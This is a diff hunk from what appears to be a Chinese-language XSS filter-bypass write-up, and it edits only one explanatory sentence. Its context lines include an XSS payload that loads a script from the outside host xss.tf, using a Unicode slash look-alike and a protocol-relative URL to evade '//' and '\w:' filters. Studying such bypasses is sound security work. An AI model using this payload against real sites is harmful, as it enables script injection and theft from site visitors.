@@ -417,7 +417,7 @@ HTTPS:E.XP>
 "><script/src="/〳xss.tf/tOH
 ```
 
-注意到除了利用 Unicode 编码绕过 `//` 过滤，还隐去了 `http:` 绕过了 `\w:` 过滤。
+注意到除了利用 Unicode 编码绕过 `//` 过滤，还通过隐去 `http:` 绕过了 `\w:` 过滤。
 
 之所以可以隐去 `http:` ，是因为在 html 的 `src` 属性中可以使用 [相对协议地址](http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/) 原理：此时前端获取资源时会根据所访问 URL 的协议而自适应（即自动识别 http 或 https）。
 
